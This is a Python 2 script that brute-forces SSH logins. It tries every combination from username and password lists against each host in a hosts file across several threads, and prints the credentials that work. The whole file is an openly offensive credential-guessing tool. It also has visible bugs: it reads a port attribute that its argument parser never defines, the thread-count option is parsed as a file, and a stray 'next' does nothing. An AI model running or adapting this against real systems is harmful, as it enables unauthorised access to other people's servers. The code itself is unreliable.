import argparse
import paramiko
import itertools
from Queue import Queue
from threading import Thread
from time import sleep


parser = argparse.ArgumentParser(description='Bruteforce ssh by list of passwords and usernames',
                                 epilog="Hello PowerLifter")
parser.add_argument('-i', type=int, default=30, help='interval between connections(default: 30 sec)')
parser.add_argument('-p', type=int, default=22, help='port to connect to(default: 22)')
parser.add_argument('--usernames', default="srnms", type=argparse.FileType("r"), help='file with usernames(default: srnms)')
parser.add_argument('--passwords', default="pswds", type=argparse.FileType("r"), help='file with passwords(default: pswds)')
parser.add_argument('--hosts', default="hsts", type=argparse.FileType("r"), help='file with hosts to connect to(default: hsts)')
parser.add_argument('--threadnum', default="hsts", type=argparse.FileType("r"), help='number of threads(default: 4)')

args = parser.parse_args()
users = []
passwords = []
combos = []


def worker(queue):
    while True:
        host = queue.get()
        for user, pwd in combos:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=args.port, username=user, password=pwd)
                print host, args.port, user, pwd
                break
            except:
                sleep(args.i)
                next

        queue.task_done()


def main():
    queue = Queue()

    # read hosts to thread-safe queue
    for hostline in args.hosts:
        queue.put(hostline.strip())

    # read all usernames
    for usrline in args.usernames:
        users.append(usrline.strip())

    # read all passwords
    for pwdline in args.passwords:
        passwords.append(pwdline.strip())

    # create all combinations of usernames and passwords
    global combos
    combos = [combo for combo in itertools.product(users, passwords)]

    # go threads
    if len(combos) < args.threadnum:
        args.threadnum = len(combos)

    for i in range(args.threadnum):
        t = Thread(target=worker, args=(queue,))
        t.daemon = True
        t.start()

    queue.join()

    return


if __name__ == "__main__":
    main()
